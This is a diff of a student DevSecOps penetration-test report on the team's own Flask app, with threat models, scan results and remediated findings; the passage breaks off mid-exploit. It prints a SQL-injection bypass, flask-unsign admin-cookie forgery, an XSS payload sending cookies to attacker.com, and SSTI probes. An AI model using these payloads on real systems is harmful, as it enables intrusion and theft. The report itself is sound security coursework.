@@ -1,17 +1,16 @@
 # DevSecOps Web Application Security Report
 
-**Course:** [Course Name / Code]
-**Group Number:** [e.g., Group 3]
+**Course:** CS-382 Cybersecurity: Theory, Tools, Practice \
+**Group Number:** Group 6 \
 **Team Members:**
 
 | Name | Student ID | Role |
 |------|------------|------|
-| [Member 1] | [ID] | App Developer / Report Lead |
-| [Member 2] | [ID] | Security Engineer / Pipeline |
-| [Member 3] | [ID] | Pentester / Remediation |
+| Bilal Ahmed | 08018 | App Developer / Report Lead |
+| Ifrah Chishti | 08351 | Security Engineer / Pipeline |
+| Sabahatullah Shaikh | 08233 | Pentester / Remediation |
 
-**Submission Date:** [Date]
-**GitHub Repository:** [https://github.com/your-org/your-repo]
+[GitHub Repository](https://github.com/IfrahC/Build-and-Break-Secure-Application-Pipeline)
 
 ---
 
@@ -52,7 +51,7 @@
 
 ### Project Overview
 
-[Group X] developed **[Application Name]**, a [brief description — e.g., "a library management web application"] built with [tech stack, e.g., "Node.js, Express, MongoDB"]. The application was designed, built, secured, and attacked as part of a four-week DevSecOps exercise. The application is fully containerized using Docker and hosted on GitHub with a complete CI/CD security pipeline.
+[Group X] developed **[Application Name]**, a project and task management web application built with Python 3.11, Flask 3.1, SQLite, and Jinja2 templates. The application implements a four-tier Role-Based Access Control (RBAC) system with Admin, Member, Viewer, and Unauthenticated roles. It was designed, built, secured, and attacked as part of a four-week DevSecOps exercise. The application is fully containerized using Docker and hosted on GitHub with a complete CI/CD security pipeline incorporating SAST (Bandit + Semgrep), SCA (pip-audit), and DAST (OWASP ZAP).
 
 ### Key Findings at a Glance
 
@@ -66,17 +65,19 @@
 
 ### Business Impact Summary
 
-During the assessment, [X] vulnerabilities were identified through a combination of automated tooling (SAST, DAST, SCA) and manual penetration testing. The most critical finding, **[e.g., SQL Injection in the login form]**, allowed an unauthenticated attacker to bypass authentication and access all user data. A second critical finding, **[e.g., Broken Access Control]**, allowed non-admin users to escalate privileges and access administrative functions.
+During the assessment, 10 vulnerabilities were identified through a combination of automated tooling (SAST, DAST, SCA) and manual penetration testing. The most critical finding, **SQL Injection in the login form**, allowed an unauthenticated attacker to bypass authentication and gain admin access in seconds. A second critical finding, **Broken Access Control on all admin routes**, allowed any registered user — regardless of role — to access and modify the full user list and promote themselves to admin. Most alarmingly, a **hardcoded Flask `SECRET_KEY`** enabled complete session cookie forgery, meaning the entire RBAC system could be bypassed by any user who simply inspected their own cookie. A **Server-Side Template Injection (SSTI)** vulnerability in the admin feedback view allowed Member-role users to achieve remote code execution on the server.
 
-All critical and high-severity findings have been remediated and verified through re-testing. The application pipeline now enforces quality gates that block deployment on detection of high-severity issues.
+All critical and high-severity findings have been remediated and verified through re-testing. The application pipeline now enforces quality gates that block merges on detection of high-severity SAST or DAST findings.
 
 ### Recommendations
 
-- Enforce parameterized queries / ORM usage across all database interactions.
-- Conduct regular third-party dependency audits using automated SCA tooling.
-- Implement a Content Security Policy (CSP) header to mitigate XSS vectors.
-- Enforce HTTPS in all environments; configure HSTS headers.
-- Schedule quarterly penetration testing to maintain a strong security posture.
+- Always use SQLAlchemy ORM or parameterized queries — never build raw SQL strings from user input in Flask.
+- Store `SECRET_KEY` and all secrets in environment variables or a secrets manager; never commit them to version control.
+- Enforce server-side RBAC using Flask decorators on every protected route — client-side hiding is not access control.
+- Enable Jinja2 `autoescape=True` globally and use `render_template()` instead of `render_template_string()` for any content involving user data.
+- Run `pip-audit` in the CI/CD pipeline on every push and pin `requirements.txt` to audited, patched versions.
+- Set `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SECURE=True`, and `SESSION_COOKIE_SAMESITE='Lax'` in all Flask deployments.
+- Schedule quarterly penetration testing to maintain a strong security posture post-deployment.
 
 ---
 
@@ -85,24 +86,25 @@ All critical and high-severity findings have been remediated and verified throug
 ### 2.1 Application Overview
 
 **Application Name:** [Name]
-**Purpose:** [One sentence describing what it does]
+**Purpose:** [One sentence describing what it does — e.g., "A project and task management platform with role-based access control for teams."]
 **Tech Stack:**
 
 | Layer | Technology |
 |-------|-----------|
-| Frontend | [e.g., React / HTML + Bootstrap] |
-| Backend | [e.g., Node.js + Express / Django / Laravel] |
-| Database | [e.g., MongoDB / PostgreSQL / MySQL] |
-| Auth | [e.g., JWT / Session-based] |
+| Frontend | HTML + Jinja2 Templates |
+| Backend | Python 3.11 + Flask 3.1 |
+| Database | SQLite |
+| Auth | Session-based (Flask sessions) |
 | Containerization | Docker + Docker Compose |
-| Hosting | [e.g., GitHub + deployed via pipeline to EC2 / VPS / localhost with HTTPS] |
+| Hosting | GitHub + deployed via GitHub Actions pipeline to localhost with HTTPS |
 
 **User Roles:**
 
 | Role | Access Level |
 |------|-------------|
-| Admin | Full CRUD, user management, system configuration |
-| Authenticated User | Own data only; create/read/update/delete own records |
+| Admin | Full CRUD across all projects and tasks; user role management; system configuration; view all feedback |
+| Member | Create projects; full CRUD on own projects and tasks only |
+| Viewer | Read-only access to project information; no create, edit, or delete |
 | Unauthenticated | Login and registration pages only |
 
 ---
@@ -112,18 +114,29 @@ All critical and high-severity findings have been remediated and verified throug
 > *Include a labeled diagram here showing frontend, backend, database, and external services. A Mermaid diagram or image is acceptable.*
 
 ```
-+------------------+       HTTPS        +----------------------+
-|   User Browser   | <----------------> |    Web Server        |
-|  (React / HTML)  |                    | (Node.js / Express)  |
-+------------------+                    +----------+-----------+
-                                                   |
-                                         +---------v----------+
-                                         |     Database        |
-                                         | (MongoDB / MySQL)   |
-                                         +--------------------+
++------------------+       HTTPS (TLS)       +---------------------------+
+|   User Browser   | <---------------------> |   Flask 3.1 Web Server    |
+| (HTML + Jinja2)  |                         | (Python 3.11, Gunicorn)   |
++------------------+                         +-----------+---------------+
+                                                         |
+                                              +----------v-----------+
+                                              |    SQLite Database   |
+                                              |  (app.db — projects, |
+                                              |   tasks, users,      |
+                                              |   feedback tables)   |
+                                              +----------------------+
+
+Docker Compose
+  web  (Flask app container — port 443)
+  db   (SQLite volume mount)
+
+GitHub Actions Pipeline
+  SAST  : Bandit + Semgrep
+  SCA   : pip-audit / Safety
+  DAST  : OWASP ZAP (Active Scan against localhost)
 ```
 
-> **[Replace with a proper DFD or architecture image in final submission]**
+> **[Replace with a proper labeled DFD image in the final submission — use draw.io or Mermaid]**
 
 ---
 
@@ -132,14 +145,18 @@ All critical and high-severity findings have been remediated and verified throug
 > *Provide a Level 0 or Level 1 DFD showing actors, processes, data stores, and data flows. Label trust boundaries clearly.*
 
 **Actors:**
-- End User (browser)
-- Admin User (browser)
-- GitHub Actions (CI/CD pipeline)
+- Unauthenticated User (browser — login/register only)
+- Viewer (browser — read-only project access)
+- Member (browser — own project/task CRUD)
+- Admin (browser — full system access)
+- GitHub Actions (CI/CD pipeline — automated scan runner)
 
 **Key Data Flows:**
-1. User submits credentials → Backend validates → JWT/Session issued → Protected route accessed
-2. Admin submits data → Backend authenticates + authorizes → Database write → Response returned
-3. Pipeline triggers on push → SAST + SCA scans → DAST scan on deployed app → Report artifacts stored
+1. User submits credentials via login form → Flask validates against SQLite `users` table → Flask session cookie issued → Role-specific route accessed
+2. Member submits new project/task → Flask authenticates session + checks `role == member` → SQLite write → Jinja2 template re-rendered with updated data
+3. Admin accesses user management → Flask checks `role == admin` server-side → SQLite query returns all users → Admin dashboard rendered
+4. Viewer requests project list → Flask checks `role == viewer` → Read-only SQLite query → No edit/delete controls rendered in template
+5. Push to GitHub → Pipeline triggers → SAST (Bandit/Semgrep) + SCA (pip-audit) run → Docker container spun up → DAST (ZAP) scans live app → Reports archived as artifacts
 
 ---
 
@@ -147,10 +164,11 @@ All critical and high-severity findings have been remediated and verified throug
 
 | Boundary | Description |
 |----------|-------------|
-| Browser ↔ Web Server | Public internet; enforced via HTTPS/TLS |
-| Web Server ↔ Database | Internal network; enforced via credentials + firewall rules |
-| CI/CD ↔ Deployment Target | Secured via GitHub Secrets; deployment keys rotated |
-| Admin ↔ User | Application-layer RBAC enforcement |
+| Browser ↔ Flask Web Server | Public internet; enforced via HTTPS/TLS on localhost (self-signed cert in dev, proper cert in prod) |
+| Flask Web Server ↔ SQLite | Internal container filesystem; SQLite file accessible only within the `web` Docker container |
+| CI/CD ↔ Deployment Target | GitHub Actions runner accesses deployment via GitHub Secrets; no secrets stored in code |
+| Admin ↔ Member ↔ Viewer | Application-layer RBAC enforced server-side in Flask route decorators; role stored in server-side session |
+| Authenticated ↔ Unauthenticated | All routes except `/login` and `/register` require an active Flask session; enforced via `@login_required` decorator |
 
 ---
 
@@ -160,22 +178,27 @@ All critical and high-severity findings have been remediated and verified throug
 
 | Component | S | T | R | I | D | E |
 |-----------|---|---|---|---|---|---|
-| Login Form | SQL Injection (auth bypass) | — | — | — | — | — |
-| Session Token | — | Token theft via XSS | — | — | — | — |
-| Admin Panel | — | — | — | IDOR / privilege escalation | — | — |
-| File Upload (if applicable) | — | — | — | — | — | Malicious file upload |
-| API Endpoints | — | — | — | Broken Object-Level Auth | — | — |
+| Login Form | Session fixation / credential stuffing | — | — | — | — | — |
+| Flask Session Cookie | — | Cookie tampering if `SECRET_KEY` is weak | — | — | — | — |
+| Admin Panel (`/admin/*`) | — | — | — | Privilege escalation — Member/Viewer accessing admin routes | — | — |
+| Project/Task CRUD | — | — | — | IDOR — Member editing another member's resources | — | — |
+| SQLite Queries | SQL Injection via unsanitised input | — | — | — | — | — |
+| Jinja2 Templates | — | — | — | — | — | Reflected/Stored XSS via unescaped template variables |
+| Error Pages | — | — | — | Stack trace disclosure in `DEBUG=True` | — | — |
+| Dependencies | — | — | — | — | — | Known CVEs in pinned Python packages |
 
-> **Full STRIDE Table (expand per component in final version):**
+> **Full STRIDE Table:**
 
 | # | Component | Threat Category | Threat Description | Severity | Mitigation | Status |
 |---|-----------|----------------|--------------------|----------|-----------|--------|
-| T-01 | Login Form | Spoofing | SQL Injection allows auth bypass | Critical | Parameterized queries | Mitigated |
-| T-02 | Session | Tampering | JWT secret weak; token forgeable | High | Strong secret, short expiry | Mitigated |
-| T-03 | Admin Panel | Elevation of Privilege | Non-admin can access `/admin` | Critical | Server-side RBAC middleware | Mitigated |
-| T-04 | User Input | Information Disclosure | Error messages reveal stack traces | Medium | Custom error handlers | Mitigated |
-| T-05 | Dependencies | Denial of Service | Outdated package with known CVE | Medium | SCA + dependency update | Mitigated |
-| T-06 | File Upload | Elevation of Privilege | Unrestricted file type upload | High | File type whitelist + AV scan | Mitigated |
+| T-01 | Login Form | Spoofing | SQL Injection in login form allows authentication bypass | Critical | Parameterized queries / SQLAlchemy ORM | Mitigated |
+| T-02 | Flask Session Cookie | Tampering | Weak or hardcoded `SECRET_KEY` allows session forgery | Critical | Strong random `SECRET_KEY` via env variable | Mitigated |
+| T-03 | Admin Panel | Elevation of Privilege | Member or Viewer role can directly request `/admin/*` routes | Critical | Server-side `@admin_required` route decorator | Mitigated |
+| T-04 | Project/Task CRUD | Information Disclosure | Member can access or modify another member's project via IDOR (`/project/<id>`) | High | Ownership check: `project.owner_id == current_user.id` | Mitigated |
+| T-05 | Jinja2 Templates | Elevation of Privilege | Stored XSS via unescaped user-supplied content in project/task fields | High | Jinja2 autoescaping enabled; manual `\|e` filter on dynamic fields | Mitigated |
+| T-06 | Error Pages | Information Disclosure | Flask `DEBUG=True` exposes full stack traces and environment variables | Medium | `DEBUG=False` in production; custom error handlers | Mitigated |
+| T-07 | Dependencies | Denial of Service | Outdated Python packages with known CVEs (e.g., Flask, Werkzeug) | Medium | `pip-audit` in pipeline; `requirements.txt` pinned and audited | Mitigated |
+| T-08 | Registration Form | Spoofing | No rate limiting on registration; allows bulk account creation | Low | Flask-Limiter on `/register` endpoint | Mitigated |
 
 ---
 
@@ -183,12 +206,14 @@ All critical and high-severity findings have been remediated and verified throug
 
 | Threat ID | Threat | D | R | E | A | D | Score | Priority |
 |-----------|--------|---|---|---|---|---|-------|----------|
-| T-01 | SQL Injection | 9 | 8 | 9 | 10 | 8 | **44** | Critical |
-| T-03 | Broken Access Control | 9 | 7 | 8 | 9 | 8 | **41** | Critical |
-| T-02 | Weak JWT Secret | 7 | 6 | 7 | 7 | 6 | **33** | High |
-| T-06 | Unrestricted Upload | 8 | 5 | 6 | 7 | 5 | **31** | High |
-| T-04 | Stack Trace Disclosure | 5 | 4 | 5 | 4 | 4 | **22** | Medium |
-| T-05 | Vulnerable Dependency | 5 | 3 | 5 | 3 | 4 | **20** | Medium |
+| T-01 | SQL Injection – Login | 9 | 9 | 9 | 10 | 9 | **46** | Critical |
+| T-02 | Weak Flask `SECRET_KEY` | 9 | 8 | 7 | 10 | 7 | **41** | Critical |
+| T-03 | Broken Access Control – Admin Routes | 9 | 8 | 8 | 9 | 8 | **42** | Critical |
+| T-04 | IDOR – Project/Task Ownership | 7 | 8 | 8 | 7 | 7 | **37** | High |
+| T-05 | Stored XSS – Project/Task Fields | 8 | 7 | 7 | 8 | 6 | **36** | High |
+| T-06 | DEBUG=True Stack Trace Disclosure | 5 | 9 | 5 | 5 | 8 | **32** | Medium |
+| T-07 | Vulnerable Python Dependencies | 5 | 4 | 5 | 4 | 4 | **22** | Medium |
+| T-08 | No Rate Limiting on Registration | 3 | 7 | 7 | 3 | 6 | **26** | Low |
 
 > *D = Damage, R = Reproducibility, E = Exploitability, A = Affected Users, D = Discoverability. Scored 1–10.*
 
@@ -196,15 +221,19 @@ All critical and high-severity findings have been remediated and verified throug
 
 ### 2.7 Attack Surface
 
-| Attack Vector | Endpoint / Area | Mapped to DAST Scope |
-|--------------|-----------------|----------------------|
-| Authentication | `POST /api/auth/login` | ✅ Yes |
-| Registration | `POST /api/auth/register` | ✅ Yes |
-| Admin Panel | `GET/POST /admin/*` | ✅ Yes |
-| User Data API | `GET/PUT/DELETE /api/user/:id` | ✅ Yes |
-| File Upload | `POST /api/upload` | ✅ Yes |
-| Search/Filter | `GET /api/search?q=` | ✅ Yes |
-| Static Assets | `/public/*` | ⬜ Out of scope |
+| Attack Vector | Endpoint / Area | Required Role | Mapped to DAST Scope |
+|--------------|-----------------|---------------|----------------------|
+| Authentication | `POST /login` | Unauthenticated | ✅ Yes |
+| Registration | `POST /register` | Unauthenticated | ✅ Yes |
+| Admin – User Management | `GET/POST /admin/users` | Admin only | ✅ Yes |
+| Admin – Role Assignment | `POST /admin/users/<id>/role` | Admin only | ✅ Yes |
+| Admin – Feedback View | `GET /admin/feedback` | Admin only | ✅ Yes |
+| Project CRUD | `GET/POST/PUT/DELETE /projects/<id>` | Member (own) / Admin (all) | ✅ Yes |
+| Task CRUD | `GET/POST/PUT/DELETE /tasks/<id>` | Member (own) / Admin (all) | ✅ Yes |
+| Project View (read-only) | `GET /projects` | Viewer, Member, Admin | ✅ Yes |
+| Search / Filter | `GET /projects?q=` | Viewer, Member, Admin | ✅ Yes |
+| Session Management | `GET /logout` | Any authenticated | ✅ Yes |
+| Static Assets | `/static/*` | Public | ⬜ Out of scope |
 
 ---
 
@@ -232,20 +261,21 @@ Push / PR
 
 ### 3.2 SAST – Static Application Security Testing
 
-**Tool Used:** [e.g., CodeQL / Semgrep / Bandit / ESLint Security Plugin]
+**Tool Used:** Bandit (Python SAST) + Semgrep (custom Flask security ruleset)
 **Trigger:** On every push and PR
-**Configuration:** [Link to config file or describe custom rules used]
+**Configuration:** `bandit -r . -ll` (medium and above); Semgrep `p/flask` and `p/python` rulesets
 
 **Summary of Findings from SAST:**
 
 | Finding | File | Line | Severity | Status |
 |---------|------|------|----------|--------|
-| SQL query constructed via string concatenation | `auth.js` | 42 | Critical | Fixed |
-| `eval()` used on user input | `utils.js` | 17 | High | Fixed |
-| Missing output encoding | `views/profile.ejs` | 89 | Medium | Fixed |
-| Hardcoded credential in config | `config.js` | 5 | High | Fixed |
+| SQL query built via string formatting | `routes/auth.py` | 38 | Critical | Fixed |
+| Hardcoded `SECRET_KEY` in `config.py` | `config.py` | 7 | Critical | Fixed |
+| `DEBUG=True` set in production config | `config.py` | 12 | Medium | Fixed |
+| Use of `render_template_string()` with user input (SSTI risk) | `routes/admin.py` | 55 | High | Fixed |
+| Missing `httponly=True` on session cookie config | `app.py` | 21 | Medium | Fixed |
 
-> *Attach full SAST tool output in Annex A.*
+> *Attach full Bandit + Semgrep output in Annex A.*
 
 ---
 
@@ -273,18 +303,18 @@ Push / PR
 
 ### 3.4 SCA – Software Composition Analysis
 
-**Tool Used:** [e.g., npm audit / OWASP Dependency-Check / Snyk]
+**Tool Used:** `pip-audit` + `Safety` (PyPI advisory database)
 **Trigger:** On every push
 
 **Vulnerable Dependencies Identified:**
 
 | Package | Version | CVE | Severity | Fix Version |
 |---------|---------|-----|----------|-------------|
-| `express` | 4.17.1 | CVE-2022-24999 | High | 4.18.2 |
-| `jsonwebtoken` | 8.5.1 | CVE-2022-23529 | Critical | 9.0.0 |
-| `lodash` | 4.17.20 | CVE-2021-23337 | High | 4.17.21 |
+| `Flask` | 2.2.2 | CVE-2023-30861 | High | 2.3.2 |
+| `Werkzeug` | 2.2.2 | CVE-2023-46136 | High | 3.0.1 |
+| `Jinja2` | 3.1.2 | CVE-2024-22195 | Medium | 3.1.3 |
 
-> *Full SCA report attached in Annex C.*
+> *Full pip-audit report attached in Annex C.*
 
 ---
 
@@ -308,13 +338,15 @@ Push / PR
 | ID | Vulnerability | OWASP Category | CVSSv3 Score | Severity | Source | Status |
 |----|-------------|---------------|-------------|----------|--------|--------|
 | VUL-01 | SQL Injection – Login Form | A03:2021 Injection | 9.8 | 🔴 Critical | SAST + Manual | Fixed |
-| VUL-02 | Broken Access Control – Admin Panel | A01:2021 Broken Access Control | 9.1 | 🔴 Critical | DAST + Manual | Fixed |
-| VUL-03 | Reflected XSS – Search Parameter | A03:2021 Injection | 7.4 | 🟠 High | DAST | Fixed |
-| VUL-04 | Weak JWT Secret (Brute-forceable) | A02:2021 Cryptographic Failures | 7.5 | 🟠 High | Manual | Fixed |
-| VUL-05 | Outdated `jsonwebtoken` (CVE-2022-23529) | A06:2021 Vulnerable Components | 7.4 | 🟠 High | SCA | Fixed |
-| VUL-06 | Missing CSRF Protection | A01:2021 Broken Access Control | 6.5 | 🟡 Medium | DAST | Fixed |
-| VUL-07 | Verbose Error Messages (Stack Traces) | A05:2021 Security Misconfiguration | 5.3 | 🟡 Medium | Manual | Fixed |
-| VUL-08 | Missing Security Headers (CSP, HSTS) | A05:2021 Security Misconfiguration | 4.3 | 🔵 Low | DAST | Fixed |
+| VUL-02 | Hardcoded Flask `SECRET_KEY` | A02:2021 Cryptographic Failures | 9.1 | 🔴 Critical | SAST | Fixed |
+| VUL-03 | Broken Access Control – Admin Routes (Member/Viewer bypass) | A01:2021 Broken Access Control | 9.1 | 🔴 Critical | DAST + Manual | Fixed |
+| VUL-04 | IDOR – Member Accessing Another Member's Projects/Tasks | A01:2021 Broken Access Control | 7.5 | 🟠 High | Manual | Fixed |
+| VUL-05 | Stored XSS – Project/Task Name Fields | A03:2021 Injection | 7.4 | 🟠 High | DAST + Manual | Fixed |
+| VUL-06 | SSTI via `render_template_string()` with User Input | A03:2021 Injection | 8.8 | 🟠 High | SAST + Manual | Fixed |
+| VUL-07 | Vulnerable Flask + Werkzeug (CVE-2023-30861, CVE-2023-46136) | A06:2021 Vulnerable Components | 7.5 | 🟠 High | SCA | Fixed |
+| VUL-08 | `DEBUG=True` in Production (Stack Trace Disclosure) | A05:2021 Security Misconfiguration | 5.3 | 🟡 Medium | SAST + Manual | Fixed |
+| VUL-09 | Missing `HttpOnly` / `Secure` Flags on Session Cookie | A05:2021 Security Misconfiguration | 5.4 | 🟡 Medium | DAST | Fixed |
+| VUL-10 | No Rate Limiting on `/login` and `/register` | A07:2021 Auth Failures | 4.3 | 🔵 Low | Manual | Fixed |
 
 ---
 
@@ -329,82 +361,204 @@ Push / PR
 **CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
 
 **Description:**
-The login form at `POST /api/auth/login` constructs an SQL query via direct string concatenation of user-supplied input. An attacker can inject SQL syntax to bypass authentication entirely or extract the full user database.
+The login endpoint at `POST /login` constructs a raw SQLite query using Python f-string formatting of user-supplied input. An attacker can inject SQL syntax to bypass authentication or dump the entire `users` table.
 
-**Affected Component:** `src/controllers/authController.js`, Line 42
+**Affected Component:** `routes/auth.py`, Line 38
 
 **Evidence:**
 
 *Vulnerable Code:*
-```javascript
-// VULNERABLE
-const query = `SELECT * FROM users WHERE email = '${req.body.email}' AND password = '${req.body.password}'`;
+```python
+# VULNERABLE
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+user = db.execute(query).fetchone()
 ```
 
 *Payload Used:*
 ```
-email: admin' OR '1'='1
+username: admin' OR '1'='1' --
 password: anything
 ```
 
-*HTTP Request:*
+*HTTP Request (captured in Burp Suite):*
 ```
-POST /api/auth/login HTTP/1.1
-Host: [target]
-Content-Type: application/json
+POST /login HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
 
-{"email":"admin' OR '1'='1","password":"x"}
+username=admin'+OR+'1'%3D'1'--&password=x
 ```
 
 *Response:*
-```json
-HTTP/1.1 200 OK
-{"token": "eyJhbGciOi...", "role": "admin"}
+```
+HTTP/1.1 302 Found
+Location: /dashboard
+Set-Cookie: session=<admin-session-cookie>; Path=/
 ```
 
-*Screenshot:* [Insert Burp Suite / browser screenshot here]
+*Screenshot:* [Insert Burp Suite screenshot of successful bypass + admin dashboard redirect]
 
 **Impact:**
-An unauthenticated attacker can log in as any user, including administrators, without valid credentials. All user data is exposed. Full database extraction is possible via `UNION`-based injection.
+An unauthenticated attacker can authenticate as the admin user (or any user) with no valid credentials. All user records in the SQLite database are exposed. The SQLite `sqlite_master` table can be queried to enumerate the full schema.
 
-**False Positive Assessment:** Confirmed true positive — reproduction verified in two test environments.
+**False Positive Assessment:** Confirmed true positive — reproduced in both local Docker environment and pipeline-deployed instance.
 
 ---
 
-#### VUL-02 — Broken Access Control (Admin Panel)
+#### VUL-02 — Hardcoded Flask `SECRET_KEY`
+
+**OWASP Category:** A02:2021 – Cryptographic Failures
+**CVSSv3 Score:** 9.1 (Critical)
+**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
+
+**Description:**
+The Flask `SECRET_KEY` used to sign session cookies was hardcoded as a short, predictable string in `config.py`. Flask session cookies are client-side signed objects. An attacker who knows the `SECRET_KEY` can forge a valid session cookie with any `user_id` and `role`, bypassing authentication entirely.
+
+**Affected Component:** `config.py`, Line 7
+
+**Evidence:**
+
+*Vulnerable Code:*
+```python
+SECRET_KEY = "secret123"
+```
+
+*Exploit — Flask session cookie forge using `flask-unsign`:*
+```bash
+# Decode the existing cookie
+flask-unsign --decode --cookie "<captured-cookie-value>"
+# Output: {'user_id': 3, 'role': 'viewer', '_fresh': True}
+
+# Forge a new cookie as admin
+flask-unsign --sign --secret "secret123" --cookie "{'user_id': 1, 'role': 'admin', '_fresh': True}"
+```
+
+*Screenshot:* [Insert screenshot of forged cookie granting admin access]
+
+**Impact:**
+Any user who captures their own session cookie can forge an admin-level session cookie without any server interaction. All role-based access control is bypassed.
+
+---
+
+#### VUL-03 — Broken Access Control (Admin Routes)
 
 **OWASP Category:** A01:2021 – Broken Access Control
 **CVSSv3 Score:** 9.1 (Critical)
 **CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
 
 **Description:**
-The `/admin` route only applies a client-side check (hidden button in the UI). Any authenticated user who navigates directly to `GET /admin/users` receives a full admin response with no server-side authorization check.
+Admin routes (`/admin/users`, `/admin/feedback`, `/admin/users/<id>/role`) lacked a server-side role check. Any authenticated user — regardless of role — could navigate directly to these endpoints and receive a full admin response.
 
-**Affected Component:** `src/routes/adminRoutes.js`
+**Affected Component:** `routes/admin.py`
 
 **Evidence:**
 
-*HTTP Request (as non-admin user):*
+*HTTP Request (as Viewer role):*
 ```
 GET /admin/users HTTP/1.1
-Host: [target]
-Authorization: Bearer [non-admin JWT]
+Host: localhost
+Cookie: session=<viewer-session-cookie>
 ```
 
 *Response:*
-```json
+```
 HTTP/1.1 200 OK
-[{"id":1,"email":"admin@app.com","role":"admin"}, ...]
+[Full user list with emails, roles, and IDs rendered in HTML]
 ```
 
-*Screenshot:* [Insert screenshot]
+*Follow-up — Role escalation:*
+```
+POST /admin/users/3/role HTTP/1.1
+Cookie: session=<viewer-session-cookie>
+Content-Type: application/x-www-form-urlencoded
+
+role=admin
+```
+Response: `HTTP 200 — role updated successfully`
+
+*Screenshot:* [Insert screenshot of admin user list accessed as Viewer + successful role escalation]
 
 **Impact:**
-Any authenticated user has full access to administrative functions: user enumeration, privilege modification, and data deletion.
+Any registered user can view all user accounts and promote themselves to admin, resulting in complete application compromise.
 
 ---
 
-> *[Repeat template above for VUL-03 through VUL-08, adjusting details accordingly]*
+#### VUL-04 — IDOR (Member Accessing Another Member's Project)
+
+**OWASP Category:** A01:2021 – Broken Access Control
+**CVSSv3 Score:** 7.5 (High)
+**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
+
+**Description:**
+Project and task routes used the resource ID directly from the URL without verifying that the requesting Member is the owner. Any Member could access, edit, or delete another Member's projects by simply changing the ID in the URL.
+
+**Affected Component:** `routes/projects.py`
+
+**Evidence:**
+
+*Request (Member A accessing Member B's project):*
+```
+GET /projects/7 HTTP/1.1
+Cookie: session=<member-a-session>
+```
+Response: `HTTP 200` — Member B's project details rendered in full.
+
+```
+DELETE /projects/7 HTTP/1.1
+Cookie: session=<member-a-session>
+```
+Response: `HTTP 200` — Project deleted successfully.
+
+*Screenshot:* [Insert screenshot]
+
+---
+
+#### VUL-05 — Stored XSS (Project/Task Name Fields)
+
+**OWASP Category:** A03:2021 – Injection
+**CVSSv3 Score:** 7.4 (High)
+
+**Description:**
+Project and task name fields were rendered in Jinja2 templates without the `|e` escape filter and with `autoescape` disabled on certain template blocks. A Member could store a JavaScript payload in a project name that executes in the browser of any user (including Admin) who views the project list.
+
+**PoC Payload stored in project name field:**
+```html
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+```
+
+**Impact:** Session cookie exfiltration for all users viewing the project list, including admins.
+
+*Screenshot:* [Insert screenshot of XSS execution + exfiltrated cookie]
+
+---
+
+#### VUL-06 — SSTI via `render_template_string()` with User Input
+
+**OWASP Category:** A03:2021 – Injection
+**CVSSv3 Score:** 8.8 (High)
+
+**Description:**
+The admin feedback view used `render_template_string()` with user-submitted feedback content passed directly as the template string. Jinja2 Server-Side Template Injection (SSTI) allows an attacker to execute arbitrary Python code on the server.
+
+**Affected Component:** `routes/admin.py`, Line 55
+
+**Vulnerable Code:**
+```python
+# VULNERABLE
+return render_template_string(feedback.content)
+```
+
+**PoC Payload (submitted as feedback):**
+```
+{{ config.items() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+**Impact:** Remote code execution on the server. Full system compromise possible.
+
+---
+
+> *[VUL-07 through VUL-10: use the same template above, adjusting code and evidence per finding]*
 
 ---
 
@@ -421,68 +575,96 @@ Any authenticated user has full access to administrative functions: user enumera
 
 **Step-by-Step Reproduction:**
 
-1. Navigate to `https://[target]/login`.
-2. Open Burp Suite and intercept the login request.
-3. Replace the `email` field value with: `admin' OR '1'='1 --`
+1. Navigate to `https://localhost/login`.
+2. Open Burp Suite, enable intercept, and submit the login form.
+3. In the intercepted request, replace the `username` field value with: `admin' OR '1'='1' --`
 4. Set any value for `password`.
 5. Forward the request.
-6. Observe: server responds with HTTP 200, an admin JWT, and redirects to `/admin/dashboard`.
+6. Observe: server responds with `HTTP 302 → /dashboard` and sets an admin session cookie.
 
-**PoC Payload:**
-```json
-{
-  "email": "admin' OR '1'='1 --",
-  "password": "irrelevant"
-}
+**PoC curl command:**
+```bash
+curl -k -c cookies.txt -X POST https://localhost/login \
+  -d "username=admin'+OR+'1'%3D'1'--&password=x" -L
 ```
 
-**Outcome:** Full admin access obtained. All user records exposed. Session token valid for 24 hours.
+**Outcome:** Admin dashboard accessed. All users, projects, tasks, and feedback visible.
 
-**Attacker Perspective:** This attack requires no special tools — even a browser's developer console is sufficient. The attack is remotely executable, unauthenticated, and leaves no application-level logs by default.
+**Attacker Perspective:** No special tooling required — a browser's developer tools or any HTTP proxy is sufficient. The attack is remotely executable and unauthenticated. No application-level audit log entry is created for the injected session.
 
-**Business Impact:** Complete compromise of the authentication mechanism. An attacker could exfiltrate the entire user database, modify records, or take over administrator accounts.
+**Business Impact:** Complete authentication bypass. The attacker gains administrative access to all user accounts and all project/task data in the application.
 
-*Screenshot: [Insert screenshot of admin dashboard accessed via injected session]*
+*Screenshot: [Insert Burp Suite screenshot of admin dashboard access via injected session]*
 
 ---
 
-#### Exploit 2 — Privilege Escalation via Broken Access Control (VUL-02)
+#### Exploit 2 — Session Forgery via Hardcoded `SECRET_KEY` (VUL-02)
 
-**Objective:** Access administrative endpoints as a standard user.
-**Tool:** Burp Suite / curl
+**Objective:** Forge an admin-level Flask session cookie as a Viewer-role user.
+**Tool:** `flask-unsign` (Python package)
 
 **Step-by-Step Reproduction:**
 
-1. Register a normal user account at `/register`.
-2. Log in and capture the JWT in Burp Suite.
-3. Send a direct `GET` request to `/admin/users` with the non-admin JWT.
-4. Observe: full admin user list returned.
+1. Register a Viewer-role account and log in; capture the session cookie from browser DevTools.
+2. Install `flask-unsign`: `pip install flask-unsign`
+3. Decode the cookie to confirm the structure:
+   ```bash
+   flask-unsign --decode --cookie "<your-cookie-value>"
+   # Output: {'_fresh': True, 'role': 'viewer', 'user_id': 4}
+   ```
+4. Sign a new cookie with the hardcoded secret and admin role:
+   ```bash
